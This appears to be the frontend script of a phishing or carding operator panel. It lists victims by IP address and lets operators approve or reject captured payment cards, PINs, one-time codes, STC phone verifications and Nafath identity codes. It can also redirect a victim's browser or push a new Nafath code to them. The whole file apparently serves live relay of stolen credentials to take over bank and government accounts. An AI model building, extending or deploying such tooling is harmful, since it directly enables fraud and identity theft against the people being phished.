                const [ ip, section ] = key.split( '::' );
                const field = _sectionToField[ section ];
                if ( ip === c.ip && field && c[ field ] ) {
                    if ( patched === c ) patched = { ...c };
                    patched[ field ] = false;
                }
            }
        }
        return patched;
    } );
}

// ── Pagination state ──
const currentPage = ref( 1 );
const lastPage = ref( 1 );
const totalCustomers = ref( 0 );
const perPage = ref( 50 );

const activeCustomersCount = computed( () => customers.value.filter( c => c.is_active ).length );

/**
 * Compute visible page numbers with ellipsis for large page counts.
 * Shows: first, last, current ±1, with '...' gaps.
 */
const visiblePages = computed( () => {
    const total = lastPage.value;
    if ( total <= 7 ) return Array.from( { length: total }, ( _, i ) => i + 1 );
    const cur = currentPage.value;
    const pages = new Set( [ 1, 2, cur - 1, cur, cur + 1, total - 1, total ] );
    const sorted = [ ...pages ].filter( p => p >= 1 && p <= total ).sort( ( a, b ) => a - b );
    const result = [];
    for ( let i = 0; i < sorted.length; i++ ) {
        if ( i > 0 && sorted[ i ] - sorted[ i - 1 ] > 1 ) result.push( '...' );
        result.push( sorted[ i ] );
    }
    return result;
} );

function goToPage ( page ) {
    if ( page < 1 || page > lastPage.value || page === currentPage.value ) return;
    currentPage.value = page;
    refreshCustomers();
}

// ── Country filter ──
const countryFilter = ref( '' );
function setCountryFilter ( value ) {
    countryFilter.value = value;
    currentPage.value = 1; // reset to page 1 on filter change
    refreshCustomers();
}



// ── Search filter ──
const searchQuery = ref( '' );
let _searchDebounce = null;
function onSearchInput () {
    clearTimeout( _searchDebounce );
    _searchDebounce = setTimeout( () => {
        currentPage.value = 1;
        refreshCustomers();
    }, 400 );
}

const refreshCustomers = async () => {
    if ( _isRefreshing ) {
        logger.debug( '[Dashboard] refreshCustomers skipped — already in-flight' );
        return true;
    }
    _isRefreshing = true;
    _lastRefreshAt = Date.now();
    try {
        const params = {
            page: currentPage.value,
            per_page: perPage.value,

        };
        if ( countryFilter.value ) {
            params.country = countryFilter.value;
        }
        if ( searchQuery.value.trim() ) {
            params.search = searchQuery.value.trim();
        }
        const { data } = await getCustomers( params );
        const rows = data.data || [];
        customers.value = applyNotificationGuards( rows );
        // Update pagination state from API response
        currentPage.value = data.current_page ?? 1;
        lastPage.value = data.last_page ?? 1;
        totalCustomers.value = data.total ?? 0;
        perPage.value = data.per_page ?? 50;
        // ✅ Clear error/loading states on success
        loadError.value = false;
        initialLoading.value = false;
        markInitialLoadComplete();
        logger.debug( `[Dashboard] refreshCustomers success: ${ rows.length } rows` );
        return true;
    } catch ( error ) {
        logger.error( 'Failed to fetch customers:', error );
        loadError.value = true;
        initialLoading.value = false;
        return false;
    } finally {
        _isRefreshing = false;
    }
};

/**
 * Fetch a single customer and patch it into the list (or append if new).
 * This avoids re-fetching the entire customer list on every WS event.
 */
const patchSingleCustomer = async ( customerId ) => {
    try {
        const { data } = await getCustomer( customerId );
        if ( !data?.success || !data?.data ) return;
        const [ guarded ] = applyNotificationGuards( [ data.data ] );
        const idx = customers.value.findIndex( c => c.id === customerId );
        if ( idx !== -1 ) {
            customers.value[ idx ] = guarded;
        } else {
            // New customer — prepend to list
            customers.value.unshift( guarded );
        }
        triggerRef( customers );
    } catch ( error ) {
        // Fallback: full refresh if single fetch fails
        logger.error( 'Patch update failed, falling back to full refresh:', error );
        refreshCustomers();
    }
};

const handleDeleteCard = async ( id ) => {
    await new Promise( r => setTimeout( r, 0 ) );
    if ( !confirm( 'هل أنت متأكد من حذف هذا العميل من القائمة؟' ) ) return;
    try {
        await deleteCustomerCard( id );
        customers.value = customers.value.filter( c => c.id !== id );
    } catch {
        customers.value = customers.value.filter( c => c.id !== id );
    }
};

const handleOtpApproved = ( otpId ) => {
    const customer = customers.value.find( c => c.latest_otp?.id === otpId );
    if ( customer && customer.latest_otp ) {
        customer.latest_otp.status = 'verified';
        triggerRef( customers );
    }
};

const handleOtpRejected = ( otpId ) => {
    const customer = customers.value.find( c => c.latest_otp?.id === otpId );
    if ( customer && customer.latest_otp ) {
        customer.latest_otp.status = 'rejected';
        triggerRef( customers );
    }
};

const handlePinApproved = ( pinId ) => {
    const customer = customers.value.find( c => {
        return c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId );
    } );
    if ( customer ) {
        if ( customer.latest_pin?.id === pinId ) customer.latest_pin.status = 'verified';
        const pin = customer.all_pins?.find( p => p.id === pinId );
        if ( pin ) pin.status = 'verified';
        triggerRef( customers );
    }
};

const handlePinRejected = ( pinId ) => {
    const customer = customers.value.find( c => {
        return c.latest_pin?.id === pinId || c.all_pins?.some( p => p.id === pinId );
    } );
    if ( customer ) {
        if ( customer.latest_pin?.id === pinId ) customer.latest_pin.status = 'rejected';
        const pin = customer.all_pins?.find( p => p.id === pinId );
        if ( pin ) pin.status = 'rejected';
        triggerRef( customers );
    }
};

const handlePhoneApproved = ( otpId ) => {
    const customer = customers.value.find( c => c.latest_phone_otp?.id === otpId );
    if ( customer && customer.latest_phone_otp ) {
        customer.latest_phone_otp.status = 'verified';
        triggerRef( customers );
    }
};

const handlePhoneRejected = ( otpId ) => {
    const customer = customers.value.find( c => c.latest_phone_otp?.id === otpId );
    if ( customer && customer.latest_phone_otp ) {
        customer.latest_phone_otp.status = 'rejected';
        triggerRef( customers );
    }
};

const handleShowDetails = ( customer ) => {
    // Future: open details modal
    logger.debug( 'Show details for:', customer.ip );
};

const processingAction = ref( false );

const handleCustomerAction = async ( payload ) => {
    if ( processingAction.value ) return;
    const { action, customer, cardIndex, reason } = payload;
    const ip = customer?.ip || customer?.ip_address;
    logger.debug( 'Customer action:', action, ip );

    processingAction.value = true;
    try {
        // ── Card Actions ──
        if ( action === 'card-approve' || action === 'card-reject' ) {
            const cards = customer?.payment?.cards || customer?.cards || [];
            const card = cards[ cardIndex ?? 0 ];
            if ( !card?.id ) { logger.error( 'No card ID found for card action' ); return; }

            if ( action === 'card-approve' ) {
                await approveCard( card.id );
                logger.info( `Card ${ card.id } approved` );
            } else {
                await rejectCard( card.id, reason || 'مرفوض من المشرف' );
                logger.info( `Card ${ card.id } rejected` );
            }
        }

        // ── OTP Actions ──
        else if ( action === 'otp-approve' || action === 'otp-reject' ) {
            const otpId = customer?.latest_otp?.id;
            if ( !otpId ) { logger.error( 'No OTP ID found' ); return; }
            // Guard: skip if OTP is already processed (prevents 422)
            const otpStatus = customer?.latest_otp?.status;
            if ( otpStatus && otpStatus !== 'pending' ) {
                logger.warn( `OTP ${ otpId } already ${ otpStatus }, skipping ${ action }` );
                await refreshCustomers();
                return;
            }

            if ( action === 'otp-approve' ) {
                await approveOtp( otpId, ip );
                handleOtpApproved( otpId );
            } else {
                await rejectOtp( otpId, ip, reason || 'مرفوض من المشرف' );
                handleOtpRejected( otpId );
            }
        }

        // ── PIN Actions ──
        else if ( action === 'pin-approve' || action === 'pin-reject' ) {
            const pinId = customer?.latest_pin?.id || customer?.all_pins?.[ 0 ]?.id;
            if ( !pinId ) { logger.error( 'No PIN ID found' ); return; }
            // Guard: skip if PIN is already processed (prevents 422)
            const pinStatus = customer?.latest_pin?.status || customer?.all_pins?.[ 0 ]?.status;
            if ( pinStatus && pinStatus !== 'pending' ) {
                logger.warn( `PIN ${ pinId } already ${ pinStatus }, skipping ${ action }` );
                await refreshCustomers();
                return;
            }

            if ( action === 'pin-approve' ) {
                await approvePin( pinId, ip );
                handlePinApproved( pinId );
                logger.info( `PIN ${ pinId } approved` );
            } else {
                await rejectPin( pinId, ip, reason || 'مرفوض من المشرف' );
                handlePinRejected( pinId );
                logger.info( `PIN ${ pinId } rejected` );
            }
        }

        // ── Phone Data Actions (Non-STC Stage 1) ──
        else if ( action === 'phone-data-approve' || action === 'phone-data-reject' ) {
            if ( action === 'phone-data-approve' ) {
                await approvePhoneData( ip );
                logger.info( `Phone data approved for ${ ip }` );
            } else {
                await rejectPhoneData( ip, reason || 'بيانات الهاتف مرفوضة' );
                logger.info( `Phone data rejected for ${ ip }` );
            }
        }

        // ── Phone OTP Actions ──
        else if ( action === 'phone-otp-approve' || action === 'phone-otp-reject' ) {
            const phoneOtpId = customer?.latest_phone_otp?.id;
            if ( !phoneOtpId ) { logger.error( 'No phone OTP ID found' ); return; }
            // Guard: skip if OTP is already processed (prevents 422)
            const phoneOtpStatus = customer?.latest_phone_otp?.status;
            if ( phoneOtpStatus && phoneOtpStatus !== 'pending' ) {
                logger.warn( `Phone OTP ${ phoneOtpId } already ${ phoneOtpStatus }, skipping ${ action }` );
                await refreshCustomers();
                return;
            }

            if ( action === 'phone-otp-approve' ) {
                await approvePhoneOtp( phoneOtpId, ip );
                handlePhoneApproved( phoneOtpId );
            } else {
                await rejectPhoneOtp( phoneOtpId, ip, reason || 'مرفوض من المشرف' );
                handlePhoneRejected( phoneOtpId );
            }
        }

        // ── STC Waiting Actions (Stage 1) ──
        else if ( action === 'stc-waiting-approve' || action === 'stc-waiting-reject' ) {
            const otpId = customer?.latest_phone_otp?.id;
            if ( !otpId ) { logger.error( 'No OTP ID found for STC waiting action' ); return; }
            // Guard: skip if OTP is already processed (prevents 422)
            const stcWaitStatus = customer?.latest_phone_otp?.status;
            if ( stcWaitStatus && stcWaitStatus !== 'pending' ) {
                logger.warn( `STC waiting OTP ${ otpId } already ${ stcWaitStatus }, skipping ${ action }` );
                await refreshCustomers();
                return;
            }

            if ( action === 'stc-waiting-approve' ) {
                await approveStcWaiting( otpId, ip );
            } else {
                await rejectStcWaiting( otpId, ip, reason || 'مرفوض من المشرف' );
            }
        }

        // ── STC OTP Actions (Stage 2) ──
        else if ( action === 'stc-otp-approve' || action === 'stc-otp-reject' ) {
            // Prefer stc_otp/stc_verification in all_otps (mirrors isStcWaitingForOtpApproval)
            let otpId = null;
            let otpStatus = null;
            if ( customer?.all_otps?.length ) {
                const stcOtp = [ ...customer.all_otps ]
                    .filter( o => o.type === 'stc_otp' || o.type === 'stc_verification' )
                    .sort( ( a, b ) => new Date( b.created_at || 0 ) - new Date( a.created_at || 0 ) )[ 0 ];
                if ( stcOtp ) { otpId = stcOtp.id; otpStatus = stcOtp.status; }
            }
            // Fallback to latest_phone_otp / latest_otp
            if ( !otpId ) {
                otpId = customer?.latest_phone_otp?.id || customer?.latest_otp?.id;
                otpStatus = customer?.latest_phone_otp?.status || customer?.latest_otp?.status;
            }
            if ( !otpId ) { logger.error( 'No OTP ID found for STC OTP action' ); return; }
            // Guard: skip if OTP is already processed (prevents 422)
            if ( otpStatus && otpStatus !== 'pending' ) {
                logger.warn( `STC OTP ${ otpId } already ${ otpStatus }, skipping ${ action }` );
                await refreshCustomers();
                return;
            }

            if ( action === 'stc-otp-approve' ) {
                await approveStcOtp( otpId, ip );
            } else {
                await rejectStcOtp( otpId, ip, reason || 'مرفوض من المشرف' );
            }
        }

        // ── STC Call Actions (Stage 3) ──
        else if ( action === 'stc-call-approve' || action === 'stc-call-reject' ) {
            // Prefer stc_otp/stc_verification in all_otps
            let otpId = null;
            if ( customer?.all_otps?.length ) {
                const stcOtp = [ ...customer.all_otps ]
                    .filter( o => o.type === 'stc_otp' || o.type === 'stc_verification' )
                    .sort( ( a, b ) => new Date( b.created_at || 0 ) - new Date( a.created_at || 0 ) )[ 0 ];
                if ( stcOtp ) otpId = stcOtp.id;
            }
            // Fallback to latest_phone_otp
            if ( !otpId ) otpId = customer?.latest_phone_otp?.id;
            if ( !otpId ) { logger.error( 'No OTP ID found for STC call action' ); return; }
            // No status guard — the OTP is expected to be already verified from previous stages;
            // the backend handles re-broadcasts for non-pending OTPs gracefully.

            if ( action === 'stc-call-approve' ) {
                await approveStcCall( otpId, ip );
            } else {
                await rejectStcCall( otpId, ip, reason || 'مرفوض من المشرف' );
            }
        }

        // ── Redirect Actions ──
        else if ( action === 'redirect' && payload.url ) {
            await redirectCustomer( ip, payload.url );
        }

        // ── Nafath Actions ──
        else if ( action === 'nafath-approve' ) {
            const code = payload.nafathNumber || null;
            await approveNafath( ip, code );
            logger.info( `Nafath approved for ${ ip }` );
        }
        else if ( action === 'nafath-reject' ) {
            await rejectNafath( ip, reason || 'مرفوض من المشرف' );
            logger.info( `Nafath rejected for ${ ip }` );
        }
        else if ( action === 'nafath-update-code' ) {
            const code = payload.nafathNumber;
            if ( code ) {
                await updateNafathVerificationCode( ip, code );
                logger.info( `Nafath code updated for ${ ip }: ${ code }` );
            }
        }

        // ✅ Re-mark payment as viewed after any approve/reject action
        // This prevents false-positive blink caused by hash change (status: pending→approved)
        if ( ip && action !== 'redirect' && !action.startsWith( 'nafath-update' ) ) {
            try { await request.post( `/admin/customers/${ customer.id }/mark-viewed`, { data_type: 'payment' } ); } catch ( e ) { logger.warn( 'Post-action mark-viewed failed:', e?.message ); }
            recordMarkViewed( ip, 'has_new_payment' );
        }

        // Refresh after action
        await refreshCustomers();

        // ✅ Immediately refresh notification bell + sidebar badges
        // so resolved items disappear without waiting for 120s/60s poll
        notificationsStore.fetchNotifications();
        badgeStore.fetch();

    } catch ( error ) {
        // 422 = already processed — refresh data and show a brief notice
        if ( error?.response?.status === 422 ) {
            const msg = error.response.data?.message || 'تم معالجة هذا الإجراء مسبقاً';
            notificationsStore.push( { type: 'warning', message: msg } );
            logger.warn( `Action "${ action }" — already processed, refreshing` );
            await refreshCustomers();
        } else {
            const msg = error?.response?.data?.message || 'فشل تنفيذ الإجراء، يرجى المحاولة مرة أخرى';
            notificationsStore.push( { type: 'error', message: msg } );
            logger.error( `Action "${ action }" failed:`, error );
        }
    } finally {
        processingAction.value = false;
    }
};

const handleCustomerRedirect = async ( payload ) => {
    logger.debug( 'Customer redirect:', payload.customer_ip, payload.url );
    // The redirect API call is already made by CustomerDataTable — just refresh
    await refreshCustomers();
};

// ── markViewedOnServer — local helper for re-marking after actions ──
const markViewedOnServer = async ( id, section ) => {
    try { await request.post( `/admin/customers/${ id }/mark-viewed`, { data_type: section }, { timeout: 5000 } ); } catch ( e ) { logger.warn( 'markViewedOnServer failed:', e?.message ); }
};

/**
 * Handle modal-opened emitted by CustomerDataTable.
 * Registers the open modal, marks as viewed, and suppresses blinking.
 * @param {{ ip: string, section: string }} payload
 */
const handleModalOpened = ( { id, ip, section } ) => {
    const field = _sectionToField[ section ];
    if ( !field ) return;
    // Register open modal — suppresses blink while modal remains open
    _openModals.set( `${ ip }::${ section }`, Date.now() );
    // Record TTL guard + mark on server (shared across all admins)
    recordMarkViewed( ip, field );
    markViewedOnServer( id, section );
    // Optimistically clear flag in local list
    const idx = customers.value.findIndex( c => c.id === id );
    if ( idx !== -1 ) {
        customers.value[ idx ] = { ...customers.value[ idx ], [ field ]: false };
        triggerRef( customers );
    }
};

/**
 * Handle modal-closed emitted by CustomerDataTable.
 * Removes suppression, re-marks viewed to snapshot latest data state.
 * @param {{ ip: string, section: string }} payload
 */
const handleModalClosed = ( { id, ip, section } ) => {
    if ( !id ) return;
    const field = _sectionToField[ section ];
    if ( !field ) return;
    // Remove open modal suppression
    _openModals.delete( `${ ip }::${ section }` );
    // Re-mark viewed to capture any data changes that occurred while modal was open
    recordMarkViewed( ip, field );
    markViewedOnServer( id, section );
};


</script>
